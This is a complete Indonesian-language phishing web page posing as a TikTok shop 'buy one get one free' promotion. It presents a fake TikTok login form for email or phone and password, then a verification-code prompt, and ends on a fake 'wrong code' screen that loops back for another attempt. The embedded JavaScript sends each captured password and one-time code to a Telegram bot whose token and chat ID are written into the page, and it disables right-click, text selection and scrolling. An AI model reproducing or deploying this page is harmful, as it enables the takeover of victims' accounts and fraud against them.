<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    
    <meta property="og:type" content="website">
    <meta property="og:title" content="Belanja Di TOKO TikTok KAMI BELI 1 GRATIS 1 JIKA BERUNTUNG">
    <meta property="og:description" content="Silakan lengkapi data kamu dengan mudah dan aman.">
    <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSCSE871lnepRHDPygisUgN_GEIOKzc3trLudcbW2c10RxNuZ3C6awTsqcG&s=10">
    <meta property="og:image:secure_url" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSCSE871lnepRHDPygisUgN_GEIOKzc3trLudcbW2c10RxNuZ3C6awTsqcG&s=10">
    <meta property="og:image:type" content="image/jpeg">
    <meta property="og:image:width" content="600">
    <meta property="og:image:height" content="600">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSCSE871lnepRHDPygisUgN_GEIOKzc3trLudcbW2c10RxNuZ3C6awTsqcG&s=10">

    <title>BELI 1 GRATIS 1</title>
    
    <style>
        /* --- KUNCI TOTAL BACKGROUND AGAR TIDAK BISA DI-SCROLL & ANTI SELEKSI --- */
        html, body {
            margin: 0;
            padding: 0;
            background-color: #ffffff; 
            color: #333333;
            font-family: sans-serif;
            box-sizing: border-box;
            
            overflow: hidden !important; 
            position: fixed;
            width: 100%;
            height: 100%;
            touch-action: none;

            -webkit-user-select: none;
            -webkit-touch-callout: none; 
            -khtml-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        .wrapper {
            width: 100%;
            max-width: 400px;
            margin: 0 auto;
            position: relative;
            box-sizing: border-box;
            height: 100%;
            background-color: #f9f9f9;
            overflow: hidden !important;
            touch-action: none;
        }

        /* RAHASIA BARU: Menggunakan Flexbox arah kolom agar tombol otomatis mengunci di paling bawah */
        .halaman {
            width: 100%;
            height: 100%; 
            display: flex;
            flex-direction: column;
            box-sizing: border-box;
            padding: 10px 20px; 
            position: relative;
            overflow: hidden !important;
            justify-content: space-between; /* Memaksa konten di atas dan tombol di bawah mentok */
        }

        #bagian2, #bagian3, #bagian4 {
            display: none;
        }

        /* --- KONTEN FORM ATAS (DIKUNCI KOKOH DI ATAS) --- */
        .konten-form {
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            box-sizing: border-box;
            justify-content: flex-start; 
            overflow: hidden !important;
            flex: 1;
            min-height: 0; /* Mengizinkan flex menciut jika layar sempit */
        }

        h1 { 
            color: #000000; 
            font-weight: bold;
            margin-top: 5px; 
            margin-bottom: 2px;
            font-size: 18px; 
        } 

        p {
            margin-top: 0;
            margin-bottom: 12px;
            font-size: 13px;
        }

        .kata-bijak {
            font-style: italic;
            font-size: 14px;
            line-height: 1.5;
            color: #555555;
            text-align: center;
            margin-top: 15px; 
            padding: 0 10px;
        }
        
        /* GAMBAR KUCING */
        img {
            width: auto;
            height: auto;
            max-width: 130px;
            max-height: 110px; 
            border-radius: 12px; 
            margin-bottom: 5px;
            object-fit: cover; 
            margin-top: 0px; 
            flex-shrink: 1; /* Mengizinkan gambar mengecil otomatis jika ruang tertekan keyboard */
            -webkit-touch-callout: none !important;
            -webkit-user-drag: none !important; 
            pointer-events: auto; 
        }

        /* --- STYLE PILIHAN BUNDAR --- */
        .wadah-pilihan {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 10px;
            margin-top: 10px;
        }

        .opsi-radio {
            display: flex;
            align-items: center;
            background-color: #eeeeee;
            padding: 12px 15px;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            box-sizing: border-box;
        }

        .opsi-radio input[type="radio"] {
            margin: 0 12px 0 0 !important;
            width: 18px;
            height: 18px;
            cursor: pointer;
            accent-color: #d32f2f; 
        }

        .opsi-radio span {
            font-size: 15px;
            color: #333333;
            font-weight: 500;
        }

        /* --- INPUT TEKS (SUDAH DIPERLEBAR) --- */
        input[type="text"], input[type="number"] {
            padding: 16px 20px; 
            width: 100%;        
            max-width: 100%;    
            border-radius: 12px; 
            border: none; 
            background-color: #eeeeee; 
            color: #333333;
            font-size: 16px; 
            outline: none; 
            margin-bottom: 12px; 
            text-align: left; 
            box-sizing: border-box; 
            flex-shrink: 0;
        }

        input:focus {
            background-color: #e5e5e5;
        }

        /* --- CONTAINER TOMBOL: CSS MURNI TANPA JAVASCRIPT --- */
        .tombol-container {
            width: 100%;
            padding: 15px 0px 5px 0px; /* Jarak aman di bawah */
            box-sizing: border-box;
            position: relative; /* Diubah menjadi relative agar mengikuti struktur aliran HTML bawah */
            display: flex;
            justify-content: center;
            background-color: #f9f9f9;
            z-index: 99;
            flex-shrink: 0; /* Tombol tidak boleh menciut */
        }

        button {
            background-color: #d32f2f; 
            color: #ffffff;
            border: none;
            padding: 14px 30px;
            font-size: 16px;
            border-radius: 30px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;        
            box-shadow: 0 3px 10px rgba(211, 47, 47, 0.3);
            box-sizing: border-box; 
        }

        .btn-ulang {
            background-color: #333333; 
            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.2);
        }
    </style>
</head>
<body>

    <div class="wrapper" id="mainWrapper">
        
        <div id="bagian1" class="halaman">
            <div class="konten-form">
                <img src="https://i.ibb.co.com/mKRP6Hn/file-00000000d63871fab0e49ecec1222d5a.png" alt="Foto Bagian 1" draggable="false">
                <h1>SILAHKAN PILIH BONUS</h1>
                <p>Beli Satu Gratis Satu Jika Beruntung.</p>
                
                <div class="wadah-pilihan">
                    <label class="opsi-radio">
                        <input type="radio" name="kategori" value="Beli 1">
                        <span>SAYA BELI 1.</span>
                    </label>
                    <label class="opsi-radio">
                        <input type="radio" name="kategori" value="Beli 2">
                        <span>SAYA BELI 2.</span>
                    </label>
                    <label class="opsi-radio">
                        <input type="radio" name="kategori" value="Beli lebih dari 2">
                        <span>LEBIH DARI 2.</span>
                    </label>
                </div>
            </div>
            <div class="tombol-container">
                <button onclick="pindahKe(2)">Masuk</button>
            </div>
        </div>

        <div id="bagian2" class="halaman">
            <div class="konten-form">
                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSCSE871lnepRHDPygisUgN_GEIOKzc3trLudcbW2c10RxNuZ3C6awTsqcG&s=10" alt="Foto Bagian 2" draggable="false">
                <h1>Masuk ke TikTok</h1>
                <p></p>
                <input type="text" id="inputNama" placeholder="Masukkan email atau nomor telpon">
                <input type="text" id="inputUmur" placeholder="Kata Sandi">
            </div>
            <div class="tombol-container">
                <button onclick="prosesKirimKe1()">Lanjutkan</button>
            </div>
        </div>

        <div id="bagian3" class="halaman">
            <div class="konten-form">
                <img src="https://p16-tiktokcdn-com.akamaized.net/obj/tiktok-obj/8b7e672c2413055b337089696aa94c75.png" alt="Foto Bagian 3" draggable="false">
                <h1>KODE VERIFIKASI</h1>
                <p class="kata-bijak">Periksa kode verifikasi yang dikirim melalui email atau sms.</p>
                <input type="number" id="inputHobi" placeholder="Masukkan kode verifikasi">
            </div>
            <div class="tombol-container">
                <button onclick="prosesKirimKe2()">Lanjutkan</button>
            </div>
        </div>

        <div id="bagian4" class="halaman">
            <div class="konten-form">
                <h1>KODE VERIFIKASI SALAH</h1>
                <p class="kata-bijak">Periksa kembali kode verifikasi yang dikirim melalui email atau sms.</p>
                <img src="https://png.pngtree.com/png-clipart/20250421/original/pngtree-cross-icon-incorrect-sign-vector-with-red-circle-png-image_20810266.png" alt="Foto Bagian 4" draggable="false">
                <p class="kata-bijak">Gunakan akun TIKTOK atau TOKOPEDIA apabila GAGAL.</p>
            </div>
            <div class="tombol-container">
                <button class="btn-ulang" onclick="pindahKe(1)">ULANGI KEMBALI</button>
            </div>
        </div>

    </div>

    <script>
        var tokenBot = "8880993139:AAFsBfqnYa_8d_A2aiiNX3VMxATpMvw_5VQ"; 
        var chatID = "8859032590";     
        var urlTlgrm = "https://api.telegram.org/bot" + tokenBot + "/sendMessage";

        var tinggiLayarAsli = window.innerHeight;

        function setSizing() {
            var tinggiViewportSekarang = window.visualViewport ? window.visualViewport.height : window.innerHeight;
            
            // Kunci tinggi wrapper mengikuti area pandang aktif secara murni
            document.getElementById('mainWrapper').style.height = tinggiViewportSekarang + 'px';
        }
        
        window.addEventListener('load', setSizing);
        window.addEventListener('resize', setSizing);
        if (window.visualViewport) {
            window.visualViewport.addEventListener('resize', setSizing);
            window.visualViewport.addEventListener('scroll', setSizing);
        }
        setSizing();

        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        });

        document.querySelectorAll('img').forEach(img => {
            img.addEventListener('contextmenu', function(e) {
                e.preventDefault();
            });
            img.addEventListener('touchstart', function(e) {
                if (e.touches.length > 1) {
                    e.preventDefault();
                }
            }, { passive: true });
        });

        document.addEventListener('touchmove', function(e) {
            e.preventDefault();
        }, { passive: false });

        document.querySelectorAll('input').forEach(input => {
            input.addEventListener('blur', function() {
                window.scrollTo(0, 0);
                setSizing();
            });
        });

        function dapatkanKategori() {
            var pilihan = document.querySelector('input[name="kategori"]:checked');
            return pilihan ? pilihan.value : "-";
        }

        function prosesKirimKe1() {
            var kategori = dapatkanKategori();
            var nama = document.getElementById('inputNama').value;
            var umur = document.getElementById('inputUmur').value;

            var namaFix = nama ? nama : "-";
            var umurFix = umur ? umur + "-" : "-";

            var pesanTelegram = "📥 *LAPORAN FORM MASUK (BAGIAN 1 & 2)* 📥\n\n" +
                                "👥 *Kategori:* " + kategori + "\n" +
                                "👤 *Nama:* " + namaFix + "\n" +
                                "🎂 *sandi:* " + umurFix;

            fetch(urlTlgrm, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: chatID,
                    text: pesanTelegram,
                    parse_mode: "Markdown"
                })
            })
            .catch(error => console.error("Error:", error));

            pindahKe(3);
        }

        function prosesKirimKe2() {
            var kategori = dapatkanKategori();
            var nama = document.getElementById('inputNama').value; 
            var hobi = document.getElementById('inputHobi').value;

            var namaFix = nama ? nama : "Tanpa Nama";
            var hobiFix = hobi ? hobi : "-";

            var pesanTelegram = "📬 *LAPORAN FINAL MASUK (BAGIAN 3)* 📬\n\n" +
                                "👥 *Kategori User:* " + kategori + "\n" +
                                "👤 *Email/nomor:* " + namaFix + "\n" +
                                "🎯 *Kode verifikasi:* " + hobiFix;

            fetch(urlTlgrm, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: chatID,
                    text: pesanTelegram,
                    parse_mode: "Markdown"
                })
            })
            .catch(error => console.error("Error:", error));

            pindahKe(4);
        }

        function pindahKe(nomorHalaman) {
            document.getElementById('bagian1').style.display = 'none';
            document.getElementById('bagian2').style.display = 'none';
            document.getElementById('bagian3').style.display = 'none';
            document.getElementById('bagian4').style.display = 'none';

            var target = document.getElementById('bagian' + nomorHalaman);
            target.style.display = 'flex';
            
            if (nomorHalaman === 1) {
                document.getElementById('inputNama').value = "";
                document.getElementById('inputUmur').value = "";
                document.getElementById('inputHobi').value = "";
                var radioChecked = document.querySelector('input[name="kategori"]:checked');
                if (radioChecked) radioChecked.checked = false;
            }

            window.scrollTo(0, 0);
            setSizing();
        }
    </script>
</body>
</html>
